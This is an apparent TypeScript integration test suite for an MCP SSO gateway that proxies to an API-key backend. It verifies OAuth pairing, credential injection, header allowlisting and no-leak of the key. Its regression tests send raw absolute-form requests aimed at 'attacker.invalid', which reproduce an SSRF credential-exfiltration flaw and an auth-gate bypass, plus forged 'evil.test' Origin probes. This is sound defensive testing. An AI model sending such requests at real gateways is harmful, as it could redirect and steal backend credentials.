// Integration tests for examples/api-key-gateway — mcp-sso as the SSO front door for
// a token-only backend MCP server (contracts §17.9 / docs/gateway-deployment.md).
//
// Ground rules (the INT bar): mkdtemp state dir, the stub backend on an EPHEMERAL
// loopback port, the gateway driven in-process (buildGatewayExample returns the app
// without listen, so the SDK client's fetch is shimmed to app.inject), and every
// SDK/wait is hang-guarded. The full proxied round trip is real: SDK client →
// gateway.inject → gateway handler → real fetch → listened backend → response back.
//
// What these prove beyond unit tests (the wiring the example exists to demonstrate):
//  - register → pairing (code from stderr) → token → /mcp → PROXIED backend round
//    trip (the backend's tool output reaches the client through the gateway);
//  - the backend credential is INJECTED server-side and the client's bridge token is
//    STRIPPED (the backend saw Bearer <backendKey>, never Bearer <bridgeToken>);
//  - the transport header allowlist (mcp-session-id / mcp-protocol-version / accept /
//    last-event-id) is forwarded; a non-allowlisted client header is NOT;
//  - the Origin 403, tokenless 401 challenge, and DELETE 405 paths; GET (SSE) is
//    forwarded and streamed, not buffered;
//  - HF.3-style no-leak: the backend key appears in NO response body, NO audit line,
//    and NO captured process output;
//  - two-path separation: the backend key never enters createBridgeConfig (rejected
//    as an unknown key with a boot AuthConfigError — contracts §5).

import assert from "node:assert/strict";
import { mkdtempSync, rmSync, readFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Socket, type AddressInfo } from "node:net";
import { test } from "node:test";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";
import { pkceChallenge } from "../src/crypto.ts";
import { AuthConfigError, createBridgeConfig } from "../src/config.ts";
import { buildBackend, type BackendReceived } from "../examples/api-key-gateway/backend.ts";
import { buildGatewayExample } from "../examples/api-key-gateway/app.ts";

const FLOW_REDIRECT = "http://localhost:4321/callback";
// A distinctive sentinel for the backend credential so the no-leak probe can grep
// for THIS exact string across response bodies, the audit log, and process output.
const BACKEND_KEY = "bk_LEAKMARKER_a91f3c7e_0123456789abcdef";

function extractValue(html: string, name: string): string {
  const m = new RegExp(`name="${name}" value="([^"]+)"`).exec(html);
  assert.ok(m?.[1], `hidden field ${name} not found`);
  return m[1] as string;
}
function extractPairingCode(text: string): string {
  const m = /code: ([BCDFGHJKLMNPQRSTVWXZ]{4}-[BCDFGHJKLMNPQRSTVWXZ]{4}-[BCDFGHJKLMNPQRSTVWXZ]{4})/.exec(text);
  assert.ok(m?.[1], "pairing code not printed");
  return m[1]!.replace(/-/g, "");
}
function json<T>(res: { body: unknown }): T {
  assert.equal(typeof res.body, "string", "inject response body is a string");
  return JSON.parse(res.body as string) as T;
}

/** Race a promise against a hard deadline. The MCP SDK transport overrides
 *  requestInit.signal with its own AbortController.signal, so the abort lever is
 *  transport.close() (in the caller's finally), not a bounded requestInit.signal. */
function withTimeout<T>(p: Promise<T>, ms: number, label: string): Promise<T> {
  return new Promise<T>((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error(`${label} timed out after ${ms}ms`)), ms);
    p.then((v) => { clearTimeout(timer); resolve(v); }, (e) => { clearTimeout(timer); reject(e); });
  });
}

/** Send a raw HTTP/1.1 request over a TCP socket. `app.inject` cannot send an
 *  absolute-form (proxy-style) request-target — the one shape that, pre-fix, let a
 *  client override the trusted backend host via `new URL(request.url, backendUrl)`.
 *  Returns the status line code + the raw response. */
function sendRaw(port: number, lines: string[]): Promise<{ status: number; raw: string }> {
  return new Promise((resolve, reject) => {
    const sock = new Socket();
    const chunks: Buffer[] = [];
    sock.connect(port, "127.0.0.1");
    sock.on("connect", () => sock.write(lines.join("\r\n")));
    sock.on("data", (c) => chunks.push(c));
    sock.on("end", () => {
      const raw = Buffer.concat(chunks).toString("utf8");
      const m = /^HTTP\/1\.1 (\d+)/.exec(raw);
      resolve({ status: m ? Number(m[1]) : 0, raw });
    });
    sock.on("error", reject);
    sock.setTimeout(5_000, () => { sock.destroy(new Error("raw socket timed out")); });
  });
}

interface InjectResult { statusCode: number; headers: Record<string, string>; body: string }

/** Route fetch calls to the gateway via app.inject (no TCP socket for the gateway).
 *  Collected bodies feed the HF.3 no-leak probe. */
function sdkFetchShim(app: { inject(args: unknown): Promise<unknown> }, captured: string[]): typeof fetch {
  return (async (url: URL | string, init?: { method?: string; headers?: unknown; body?: unknown }): Promise<Response> => {
    const u = url instanceof URL ? url : new URL(String(url));
    const headers: Record<string, string> = {};
    const src = init?.headers;
    if (src instanceof Headers) src.forEach((v, k) => { headers[k] = v; });
    else if (src && typeof src === "object") for (const [k, v] of Object.entries(src as Record<string, string>)) headers[k] = v;
    const method = (init?.method ?? "POST") as "POST" | "GET" | "DELETE";
    const payload = init?.body === undefined || init?.body === null
      ? undefined
      : typeof init.body === "string" ? init.body : JSON.stringify(init.body);
    const r = await app.inject(payload === undefined ? { method, url: u.pathname + u.search, headers } : { method, url: u.pathname + u.search, headers, payload }) as unknown as InjectResult;
    captured.push(r.body);
    return new Response(r.body, { status: r.statusCode, headers: r.headers });
  }) as typeof fetch;
}

interface Harness {
  app: { inject(args: unknown): Promise<unknown>; close(): Promise<void> };
  backend: { close(): Promise<void> };
  backendUrl: string;
  received: BackendReceived[];
  auditPath: string;
  dir: string;
  resource: string;
  issuer: string;
  cleanup: () => Promise<void>;
}

/** Build the stub backend (ephemeral loopback port, recording what it receives) +
 *  the gateway (in-process, console pairing zero-setup). Does NOT run the OAuth flow. */
async function buildHarness(opts: { issuer?: string } = {}): Promise<Harness> {
  const base = mkdtempSync(join(tmpdir(), "mcp-sso-gateway-"));
  const dir = join(base, "state");
  const received: BackendReceived[] = [];
  const ORIGIN = opts.issuer ?? "http://localhost:3000";
  // Backend on an ephemeral loopback port.
  const backend = await buildBackend({ apiKey: BACKEND_KEY, recordReceived: (e) => received.push(e) });
  await backend.app.listen({ port: 0, host: "127.0.0.1" });
  const addr = backend.app.server.address() as AddressInfo;
  const backendUrl = `http://127.0.0.1:${addr.port}/mcp`;
  // Gateway (console pairing zero-setup). If this throws partway, close the already-
  // listened backend socket + remove the temp dir before rethrowing (no leak).
  let built: { app: Harness["app"]; store: { close(): Promise<void> }; config: { resource: string; issuer: string } };
  try {
    built = await buildGatewayExample(
      { MCP_SSO_DIR: dir, OAUTH_ISSUER: ORIGIN, OAUTH_RESOURCE: `${ORIGIN}/mcp`, OAUTH_REDIRECT_ALLOWLIST: FLOW_REDIRECT },
      { backendUrl, getBackendCredential: () => BACKEND_KEY },
    ) as never;
  } catch (err) {
    await backend.close();
    rmSync(base, { recursive: true, force: true });
    throw err;
  }
  const { app, store, config } = built;
  const auditPath = join(dir, "audit.jsonl");
  const cleanup = async () => { await app.close(); await store.close(); await backend.close(); rmSync(base, { recursive: true, force: true }); };
  return { app: app as never, backend, backendUrl, received, auditPath, dir, resource: config.resource, issuer: config.issuer, cleanup };
}

/** Run the pairing OAuth flow and return a bridge-minted access token (for the
 *  bridge-token-stripping assertion we also surface the access token itself). */
async function pairingToken(app: { inject(args: unknown): Promise<unknown> }, captured: string[]): Promise<{ accessToken: string; clientId: string }> {
  const verifier = "correct-horse-battery-staple-0123456789abcdef0123";
  const reg = await app.inject({ method: "POST", url: "/oauth/register", headers: { "content-type": "application/json" }, payload: JSON.stringify({ redirect_uris: [FLOW_REDIRECT] }) }) as unknown as InjectResult;
  captured.push(reg.body);
  assert.equal(reg.statusCode, 201);
  const clientId = json<{ client_id: string }>(reg).client_id;
  const q = new URLSearchParams({ response_type: "code", client_id: clientId, redirect_uri: FLOW_REDIRECT, code_challenge: pkceChallenge(verifier), code_challenge_method: "S256", scope: "mcp:read", state: "s1" });

  // GET /authorize renders the pairing page; the code is printed to process.stderr.
  let code: string;
  let pairingNonce: string;
  const originalWrite = process.stderr.write.bind(process.stderr);
  const chunks: string[] = [];
  process.stderr.write = ((s: string | Uint8Array): boolean => { chunks.push(typeof s === "string" ? s : Buffer.from(s).toString()); return true; }) as typeof process.stderr.write;
  try {
    const pairingPage = await app.inject({ method: "GET", url: `/oauth/authorize?${q}` }) as unknown as InjectResult;
    captured.push(pairingPage.body);
    assert.equal(pairingPage.statusCode, 200);
    pairingNonce = extractValue(pairingPage.body, "pairing_nonce");
    code = extractPairingCode(chunks.join(""));
  } finally {
    process.stderr.write = originalWrite;
  }

  const consentPage = await app.inject({ method: "POST", url: "/oauth/authorize", headers: { "content-type": "application/x-www-form-urlencoded" }, payload: new URLSearchParams({ ...Object.fromEntries(q), pairing_code: code, pairing_nonce: pairingNonce }).toString() }) as unknown as InjectResult;
  captured.push(consentPage.body);
  assert.equal(consentPage.statusCode, 200);
  const consentToken = extractValue(consentPage.body, "consent_token");

  const approve = await app.inject({ method: "POST", url: "/oauth/authorize/approve", headers: { "content-type": "application/x-www-form-urlencoded", origin: "http://localhost:3000" }, payload: new URLSearchParams({ consent_token: consentToken, approved: "true" }).toString() }) as unknown as InjectResult;
  captured.push(approve.body);
  assert.equal(approve.statusCode, 302);
  const authCode = new URL(approve.headers.location as string).searchParams.get("code");
  assert.ok(authCode);

  const tokenResp = await app.inject({ method: "POST", url: "/oauth/token", headers: { "content-type": "application/x-www-form-urlencoded" }, payload: new URLSearchParams({ grant_type: "authorization_code", code: authCode as string, redirect_uri: FLOW_REDIRECT, client_id: clientId, code_verifier: verifier }).toString() }) as unknown as InjectResult;
  captured.push(tokenResp.body);
  assert.equal(tokenResp.statusCode, 200);
  const { access_token: accessToken } = json<{ access_token: string }>(tokenResp);
  return { accessToken, clientId };
}

test("integration — gateway /mcp Origin gate + tokenless 401 challenge on ALL methods (POST/GET/DELETE)", async () => {
  const h = await buildHarness();
  try {
    const init = JSON.stringify({ jsonrpc: "2.0", method: "initialize", params: { protocolVersion: "2025-11-25", capabilities: {}, clientInfo: { name: "x", version: "0" } }, id: 1 });
    // Foreign Origin ⇒ 403 on every method, BEFORE the bearer leg (no challenge).
    for (const method of ["POST", "GET", "DELETE"] as const) {
      const evil = await h.app.inject({ method, url: "/mcp", headers: { "content-type": "application/json", origin: "https://evil.test" }, ...(method === "POST" ? { payload: init } : {}) }) as unknown as InjectResult;
      assert.equal(evil.statusCode, 403, `foreign Origin rejected on ${method}`);
      assert.doesNotMatch(evil.headers["www-authenticate"] ?? "", /resource_metadata=/, `${method}: Origin gate fires before the authorize leg`);
    }
    // Foreign Origin beats body parsing: malformed JSON with a foreign Origin ⇒ 403, not 400.
    const evilBadBody = await h.app.inject({ method: "POST", url: "/mcp", headers: { "content-type": "application/json", origin: "https://evil.test" }, payload: "{not valid json" }) as unknown as InjectResult;
    assert.equal(evilBadBody.statusCode, 403, "foreign Origin rejected before body parsing (malformed JSON ⇒ 403, not 400)");

    // Absent Origin (the normal MCP-client case) + no token ⇒ 401 + the resource_metadata
    // challenge on every method (so a client can discover the AS and start the flow).
    for (const method of ["POST", "GET", "DELETE"] as const) {
      const noToken = await h.app.inject({ method, url: "/mcp", headers: { "content-type": "application/json" }, ...(method === "POST" ? { payload: init } : {}) }) as unknown as InjectResult;
      assert.equal(noToken.statusCode, 401, `${method}: tokenless ⇒ 401`);
      assert.match(noToken.headers["www-authenticate"] ?? "", /^Bearer resource_metadata=/, `${method}: challenge carries resource_metadata`);
    }
  } finally {
    await h.cleanup();
  }
});

test("integration — gateway: full proxied round trip (pairing→token→SDK client→backend), stripping/injection, forwarding, DELETE 405, GET SSE, HF.3 no-leak", async () => {
  const captured: string[] = []; // every response body the client/test sees (HF.3 probe)
  const h = await buildHarness();
  try {
    const { accessToken } = await pairingToken(h.app as never, captured);

    // Capture process stderr for EVERY forward-path operation (the path that calls
    // getBackendCredential) — the backend credential must never be logged. Installed
    // AFTER pairingToken, which captures its one-time code in its own nested window
    // and restores to this wrapper on return.
    const orig = process.stderr.write.bind(process.stderr);
    const errChunks: string[] = [];
    process.stderr.write = ((s: string | Uint8Array): boolean => { errChunks.push(typeof s === "string" ? s : Buffer.from(s).toString()); return true; }) as typeof process.stderr.write;
    try {
      // --- Full proxied round trip via the OFFICIAL MCP SDK client. ---
      const transport = new StreamableHTTPClientTransport(new URL(h.resource), { fetch: sdkFetchShim(h.app, captured) as never, requestInit: { headers: { authorization: `Bearer ${accessToken}` } } });
      const client = new Client({ name: "int-gateway", version: "0.0.1" }, { capabilities: {} });
      try {
        await withTimeout(client.connect(transport), 10_000, "MCP client connect (through proxy)");
        const result = await withTimeout(client.callTool({ name: "status", arguments: {} }), 10_000, "MCP client callTool (through proxy)");
        const text = (result.content as Array<{ type: string; text?: string }>).find((c) => c.type === "text")?.text ?? "";
        // The BACKEND's tool output reached the client through the gateway — the proxy
        // round trip is genuine (the gateway could not have synthesized this marker).
        assert.match(text, /"backend":"stub-backend-v1"/, "proxied backend tool output reached the client");
      } finally {
        await client.close();
        await transport.close();
      }

      // --- Stripping + injection (from the real round trip): every backend receipt
      //     carried the injected backend credential, NEVER the client's bridge token. ---
      assert.ok(h.received.length > 0, "the backend received at least one proxied POST");
      for (const r of h.received) {
        assert.equal(r.authorization, `Bearer ${BACKEND_KEY}`, "backend saw the INJECTED backend credential");
        assert.notEqual(r.authorization, `Bearer ${accessToken}`, "backend did NOT see the client's bridge token (stripped)");
      }
      // MCP-Protocol-Version was forwarded to the backend (the SDK client sends it post-init).
      assert.ok(h.received.some((r) => r.mcpProtocolVersion), "mcp-protocol-version forwarded to the backend");

      // --- Forwarding allowlist (deterministic): a raw POST carrying the transport
      //     headers AND non-allowlisted client headers. The backend records what it
      //     actually got, so we prove the allowlist forwards the transport set AND
      //     drops the rest (fail-closed — the security point of the example). ---
      const initBody = JSON.stringify({ jsonrpc: "2.0", method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "fwd", version: "0" } }, id: 1 });
      const fwd = await withTimeout(h.app.inject({
        method: "POST", url: "/mcp",
        headers: {
          "content-type": "application/json", authorization: `Bearer ${accessToken}`,
          "mcp-session-id": "sess-fake-123", "mcp-protocol-version": "2025-06-18",
          "accept": "application/json, text/event-stream", "last-event-id": "evt-5",
          "x-client-secret": "should-not-forward", "cookie": "should-not-forward",
        },
        payload: initBody,
      }), 5_000, "forwarded POST") as unknown as InjectResult;
      captured.push(fwd.body);
      const seen = h.received.at(-1);
      if (!seen) throw new Error("forwarded POST did not reach the backend (nothing recorded)");
      // Transport headers forwarded:
      assert.equal(seen.mcpSessionId, "sess-fake-123", "mcp-session-id forwarded");
      assert.equal(seen.mcpProtocolVersion, "2025-06-18", "mcp-protocol-version forwarded");
      assert.equal(seen.accept, "application/json, text/event-stream", "accept forwarded");
      assert.equal(seen.lastEventId, "evt-5", "last-event-id forwarded");
      assert.equal(seen.authorization, `Bearer ${BACKEND_KEY}`, "forwarded request got the backend credential (not the client Authorization)");
      // Allowlist is fail-closed: non-allowlisted client headers did NOT reach the backend.
      assert.ok(!seen.receivedHeaderNames.includes("x-client-secret"), "non-allowlisted 'x-client-secret' dropped (allowlist fail-closed)");
      assert.ok(!seen.receivedHeaderNames.includes("cookie"), "non-allowlisted 'cookie' dropped (allowlist fail-closed)");

      // --- DELETE ⇒ explicit 405 (behind the gate: a valid token was accepted first). ---
      const del = await withTimeout(h.app.inject({ method: "DELETE", url: "/mcp", headers: { authorization: `Bearer ${accessToken}` } }), 5_000, "DELETE /mcp") as unknown as InjectResult;
      captured.push(del.body);
      assert.equal(del.statusCode, 405, "DELETE /mcp ⇒ 405 (backend has no session termination)");

      // --- GET (SSE) forwarded + streamed (not buffered): the backend's bounded SSE
      //     body comes back through the gateway with the SSE content-type + content. ---
      const sse = await withTimeout(h.app.inject({ method: "GET", url: "/mcp", headers: { authorization: `Bearer ${accessToken}`, accept: "text/event-stream" } }), 5_000, "GET /mcp (SSE)") as unknown as InjectResult;
      captured.push(sse.body);
      assert.equal(sse.statusCode, 200, "GET /mcp proxied (200)");
      assert.match(sse.headers["content-type"] ?? "", /text\/event-stream/, "GET response is SSE (relayed content-type)");
      assert.match(sse.body, /event: open/, "SSE 'open' event streamed through the gateway");
      assert.match(sse.body, /stub-backend-v1/, "SSE data streamed through the gateway");

      // --- HF.3-style no-leak: the backend credential appears in NO response body,
      //     NO audit line, NO captured process stderr (across the whole forward path).
      //     The audit check is fail-loud: if the sink file is absent the probe would
      //     pass vacuously, so assert it exists first. ---
      for (const body of captured) {
        assert.doesNotMatch(body, /LEAKMARKER/, "backend credential did NOT leak into a response body");
      }
      assert.ok(existsSync(h.auditPath), "audit.jsonl must exist after the flow — else the no-leak probe is vacuous (audit sink broken or refactored away)");
      assert.doesNotMatch(readFileSync(h.auditPath, "utf8"), /LEAKMARKER/, "backend credential did NOT leak into the audit log");
      assert.doesNotMatch(errChunks.join(""), /LEAKMARKER/, "backend credential did NOT leak to process stderr across the forward path");
    } finally {
      process.stderr.write = orig;
    }
  } finally {
    await h.cleanup();
  }
});

test("integration — gateway two-path separation: the backend credential never enters createBridgeConfig (rejected as an unknown key)", async () => {
  // createBridgeConfig rejects unknown top-level keys (string OR symbol) with a boot
  // AuthConfigError BEFORE any other validation (contracts §5) — so a backend
  // credential parked on the input fails the boot instead of shipping on the public
  // frozen bridge.config. The gateway reads it into the getBackendCredential() closure
  // instead; the two paths stay separate. This test pins the fail-closed reality the
  // example + docs/gateway-deployment.md rely on.
  assert.throws(
    () => createBridgeConfig({
      issuer: "https://x.test", resource: "https://x.test/mcp",
      consentSigningSecret: "x".repeat(40), signingPrivateJwk: { kty: "EC", crv: "P-256", d: "d", x: "x", y: "y" },
      redirectAllowlist: [], scopeCatalog: ["mcp:read"], defaultScopes: ["mcp:read"], allowedOrigins: ["https://x.test"],
      dcr: { mode: "stateless" },
      accessTokenTtlSeconds: 600, refreshTokenTtlSeconds: 2_592_000, consentTokenTtlSeconds: 300, authorizationCodeTtlSeconds: 300,
      // The offending key — exactly the mistake the separation prevents:
      ...{ backendApiKey: BACKEND_KEY },
    } as never),
    AuthConfigError,
  );
});

test("integration — gateway: an absolute-form request-target cannot redirect the forward (SSRF / backend-credential exfiltration guard)", async () => {
  // Regression for the HIGH review finding: `new URL(request.url, opts.backendUrl)`
  // let a client-supplied absolute-form request-target (`POST http://attacker/mcp`)
  // override the trusted backend host, exfiltrating BACKEND_API_KEY. The fix derives
  // the outbound host from backendUrl ONLY (the inbound request contributes at most
  // its query string). Verified over a raw socket — inject cannot send an
  // absolute-form request-target, but a TCP client (any bridge-token holder) can.
  const h = await buildHarness();
  const gateway = h.app as never as { listen(o: { port: number; host: string }): Promise<unknown>; server: { address(): AddressInfo } };
  await gateway.listen({ port: 0, host: "127.0.0.1" });
  try {
    const { accessToken } = await pairingToken(h.app as never, []);
    const port = gateway.server.address().port;
    const body = JSON.stringify({ jsonrpc: "2.0", method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "x", version: "0" } }, id: 1 });
    const before = h.received.length;
    // Absolute-form request-target to a .invalid host (RFC 2606 — never resolves).
    // Pre-fix: fetch targeted attacker.invalid → DNS fail → 502, backend recorded
    // nothing, AND the credential would have left to a resolvable attacker host.
    // Post-fix: the host comes from backendUrl → the trusted backend is hit.
    const res = await withTimeout(sendRaw(port, [
      "POST http://attacker.invalid/mcp HTTP/1.1",
      `Host: 127.0.0.1:${port}`,
      `Authorization: Bearer ${accessToken}`,
      "Content-Type: application/json",
      "Accept: application/json, text/event-stream",
      `Content-Length: ${Buffer.byteLength(body)}`,
      "Connection: close",
      "", body,
    ]), 5_000, "absolute-form raw POST");
    assert.equal(h.received.length, before + 1, "absolute-form request-target forwarded to the TRUSTED backend, not the attacker host");
    assert.equal(h.received.at(-1)?.authorization, `Bearer ${BACKEND_KEY}`, "backend credential injected at the trusted backend (not exfiltrated to the attacker host)");
    assert.notEqual(res.status, 502, "the forward succeeded against the trusted backend (not a backend-unreachable 502)");
    // The absolute-form target must also keep the body on the gateway's RAW path
    // through the JSON parser (P2): a raw `req.url === "/mcp"` would JSON-parse it and
    // forward "[object Object]", so the proxied initialize would fail. The backend
    // handled it — 200 with a JSON-RPC result.
    assert.equal(res.status, 200, "absolute-form proxied initialize succeeded (body forwarded raw, not garbled)");
    assert.match(res.raw, /"result"/, "the backend's initialize result came back through the gateway");
  } finally {
    await h.cleanup();
  }
});

test("integration — gateway backend: an absolute-form request-target cannot bypass the backend's static-credential gate (Codex P1)", async () => {
  // The backend's auth gate must apply to /mcp regardless of request-target form.
  // An absolute-form target (`POST http://host/mcp`) routes to the /mcp handler with
  // request.url = the full URL; a raw `request.url === "/mcp"` check would SKIP the
  // gate, letting anyone who can reach the backend bypass BACKEND_API_KEY. The fix
  // parses the pathname. Reach the backend DIRECTLY (not via the gateway), no
  // Authorization — it must still be 401'd.
  const h = await buildHarness();
  try {
    const backendPort = Number(new URL(h.backendUrl).port);
    const body = JSON.stringify({ jsonrpc: "2.0", method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "x", version: "0" } }, id: 1 });
    const res = await withTimeout(sendRaw(backendPort, [
      "POST http://attacker.invalid/mcp HTTP/1.1",
      `Host: 127.0.0.1:${backendPort}`,
      "Content-Type: application/json",
      `Content-Length: ${Buffer.byteLength(body)}`,
      "Connection: close",
      "", body,
    ]), 5_000, "absolute-form direct-to-backend POST (no key)");
    assert.equal(res.status, 401, "absolute-form request-target did NOT bypass the backend credential gate");
  } finally {
    await h.cleanup();
  }
});

